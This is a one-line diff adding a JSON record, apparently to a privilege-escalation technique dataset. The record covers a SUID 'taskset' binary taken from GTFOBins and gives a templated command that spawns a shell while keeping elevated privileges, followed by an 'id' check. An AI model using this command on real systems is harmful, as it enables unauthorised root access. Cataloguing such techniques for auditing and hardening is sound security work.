@@ -1,0 +1,1 @@
+{"id":"suid_taskset","category":"SUID_GTFOBINS","binary":"taskset","cve":null,"exploitation":["{{binary}} 1 {{shell}} -p"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
